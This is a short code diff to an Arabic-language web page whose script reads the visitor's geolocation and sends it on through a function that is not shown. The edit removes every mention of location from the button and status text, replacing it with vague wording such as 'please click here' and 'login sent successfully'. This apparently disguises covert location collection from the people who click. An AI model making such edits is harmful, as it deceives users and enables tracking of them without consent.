@@ -51,7 +51,7 @@
 </head>
 <body>
     <div class="container">
-        <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
+        <button onclick="getLocation()">من فضلك اضغط هنا</button>
         <div class="loading" id="loading" style="display: none;"></div>
         <p id="status"></p>
     </div>
@@ -62,12 +62,12 @@
 
         async function getLocation() {
             loadingElement.style.display = "block";
-            statusElement.textContent = "جاري تحديد الموقع...";
+            statusElement.textContent = "جاري تنفيذ طلبك...";
             
             try {
                 const position = await getCurrentPosition();
                 await sendLocationData(position);
-                statusElement.textContent = "تم إرسال الموقع بنجاح!";
+                statusElement.textContent = "تم إرسال الدخول بنجاح!";
             } catch (error) {
                 console.error("Error:", error);
                 statusElement.textContent = "حدث خطأ: " + error.message;
